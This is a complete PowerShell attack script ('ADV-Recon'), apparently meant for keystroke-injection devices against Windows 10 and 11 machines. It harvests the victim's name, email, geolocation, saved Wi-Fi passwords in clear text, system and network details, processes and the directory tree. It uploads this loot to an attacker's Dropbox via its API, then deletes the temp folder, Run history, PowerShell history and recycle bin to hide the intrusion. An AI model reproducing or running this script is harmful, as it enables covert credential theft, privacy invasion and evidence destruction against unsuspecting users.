############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : ADV-Recon         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Recon             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#                                                                                                            #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################
                                                                                                                                                                                                                                               
<#

.SYNOPSIS
	This is an advanced recon of a target PC and exfiltration of that data

.DESCRIPTION 
	This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running
	All of the gather information is formatted neatly and output to a file 
	That file is then exfiltrated to cloud storage via DropBox

.Link
	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
#>

############################################################################################################################################################

$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"

############################################################################################################################################################

 function Get-fullName {

    try {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

    }
 
 # If no name is detected function will return $env:UserName 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName 

}

$FN = Get-fullName

#------------------------------------------------------------------------------------------------------------------------------------

function Get-email {
    
    try {

    $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
	return $email
    }

# If no email is detected function will return backup message for sapi speak

    # Write Error is just for troubleshooting
    catch {Write-Error "An email was not found" 
    return "No Email Detected"
    -ErrorAction SilentlyContinue
    }        
}

$EM = Get-email

#------------------------------------------------------------------------------------------------------------------------------------

function Get-GeoLocation{
	try {
	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
	$GeoWatcher.Start() #Begin resolving current locaton

	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
		Start-Sleep -Milliseconds 100 #Wait for discovery.
	}  

	if ($GeoWatcher.Permission -eq 'Denied'){
		Write-Error 'Access Denied for Location Information'
	} else {
		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
	}
	}
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
    return "No Coordinates found"
    -ErrorAction SilentlyContinue
    } 

}

$GL = Get-GeoLocation

############################################################################################################################################################

# Get nearby wifi networks

try
{
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
}
catch
{
$NearbyWifi="No nearby wifi networks detected"
}

############################################################################################################################################################

# Get info about pc

# Get IP / Network Info
try
{
$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
}
catch
{
$computerPubIP="Error getting Public IP"
}

$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}

############################################################################################################################################################

$IsDHCPEnabled = $false
$Networks =  Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | ? {$_.IPEnabled}
foreach ($Network in $Networks) {
If($network.DHCPEnabled) {
$IsDHCPEnabled = $true
  }
$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)
}

############################################################################################################################################################

#Get System Info
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerBIOS = Get-CimInstance CIM_BIOSElement

$computerOs=Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List

$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table

############################################################################################################################################################

# Get HDDs
$driveType = @{
   2="Removable disk "
   3="Fixed local disk "
   4="Network disk "
   5="Compact disk "}
$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }

#Get - Com & Serial Devices
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table

# Check RDP
$RDP
if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
	$RDP = "RDP is Enabled" 
} else {
	$RDP = "RDP is NOT enabled" 
}

############################################################################################################################################################

# Get Network Interfaces
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

# Get wifi SSIDs and Passwords	
$WLANProfileNames =@()
#Get all the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "
#Trim the output to receive only the name
Foreach($WLANProfileName in $Output){
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects =@()
#Bind the WLAN profile names and also the password to a custom object
Foreach($WLANProfileName in $WLANProfileNames){
    #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    }Catch{
        $WLANProfilePassword = "The password is not stored in this profile"
    }
    #Build the object and add this to an array
    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject
}

############################################################################################################################################################

# local-user
$luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID

# process first
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine

# Get Listeners / ActiveTcpConnections
$listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
$listener = $listener | foreach-object {
    $listenerItem = $_
    $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
    new-object PSObject -property @{
      "LocalAddress" = $listenerItem.LocalAddress
      "RemoteAddress" = $listenerItem.RemoteAddress
      "State" = $listenerItem.State
      "AppliedSetting" = $listenerItem.AppliedSetting
      "OwningProcess" = $listenerItem.OwningProcess
      "ProcessName" = $processItem.ProcessName
    }
} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table 

# process last
$process = $process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine

# service
$service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName

# installed software (get uninstaller)
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize

# drivers
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion

# videocard
$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution

############################################################################################################################################################

# MAKE LOOT FOLDER 

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt"

############################################################################################################################################################

# OUTPUTS RESULTS TO LOOT FILE

Clear-Host
Write-Host 

echo "Name:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $FN >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
echo "Email:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $EM >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
echo "GeoLocation:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $GL >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
echo "Nearby Wifi:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $NearbyWifi >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
$computerSystem.Name >> $env:TMP\$FileName
"==================================================================
Manufacturer: " + $computerSystem.Manufacturer >> $env:TMP\$FileName
"Model: " + $computerSystem.Model >> $env:TMP\$FileName
"Serial Number: " + $computerBIOS.SerialNumber >> $env:TMP\$FileName
"" >> $env:TMP\$FileName
"" >> $env:TMP\$FileName
"" >> $env:TMP\$FileName

"OS:
=================================================================="+ ($computerOs |out-string) >> $env:TMP\$FileName

"CPU:
=================================================================="+ ($computerCpu| out-string) >> $env:TMP\$FileName

"RAM:
==================================================================
Capacity: " + $computerRamCapacity+ ($computerRam| out-string) >> $env:TMP\$FileName

"Mainboard:
=================================================================="+ ($computerMainboard| out-string) >> $env:TMP\$FileName

"Bios:
=================================================================="+ (Get-WmiObject win32_bios| out-string) >> $env:TMP\$FileName


"Local-user:
=================================================================="+ ($luser| out-string) >> $env:TMP\$FileName

"HDDs:
=================================================================="+ ($Hdds| out-string) >> $env:TMP\$FileName

"COM & SERIAL DEVICES:
==================================================================" + ($COMDevices | Out-String) >> $env:TMP\$FileName

"Network: 
==================================================================
Computers MAC address: " + $MAC >> $env:TMP\$FileName
"Computers IP address: " + $computerIP.ipaddress[0] >> $env:TMP\$FileName
"Public IP address: " + $computerPubIP >> $env:TMP\$FileName
"RDP: " + $RDP >> $env:TMP\$FileName
"" >> $env:TMP\$FileName
($Network| out-string) >> $env:TMP\$FileName

"W-Lan profiles: 
=================================================================="+ ($WLANProfileObjects| Out-String) >> $env:TMP\$FileName

"listeners / ActiveTcpConnections
=================================================================="+ ($listener| Out-String) >> $env:TMP\$FileName

"Current running process: 
=================================================================="+ ($process| Out-String) >> $env:TMP\$FileName

"Services: 
=================================================================="+ ($service| Out-String) >> $env:TMP\$FileName

"Installed software:
=================================================================="+ ($software| Out-String) >> $env:TMP\$FileName

"Installed drivers:
=================================================================="+ ($drivers| Out-String) >> $env:TMP\$FileName

"Installed videocards:
==================================================================" + ($videocard| Out-String) >> $env:TMP\$FileName


############################################################################################################################################################

# Recon all User Directories
#tree $Env:userprofile /a /f | Out-File -FilePath $Env:tmp\j-loot\tree.txt
tree $Env:userprofile /a /f >> $env:TMP\$FileName

############################################################################################################################################################

# Remove Variables

Remove-Variable -Name computerPubIP,
computerIP,IsDHCPEnabled,Network,Networks, 
computerMAC,computerSystem,computerBIOS,computerOs,
computerCpu, computerMainboard,computerRamCapacity,
computerRam,driveType,Hdds,RDP,WLANProfileNames,WLANProfileName,
Output,WLANProfileObjects,WLANProfilePassword,WLANProfileObject,luser,
process,listener,listenerItem,process,service,software,drivers,videocard,
vault -ErrorAction SilentlyContinue -Force

############################################################################################################################################################

# Upload output file to dropbox

$TargetFilePath="/$FileName"
$SourceFilePath="$env:TMP\$FileName"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers

############################################################################################################################################################

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

		

	
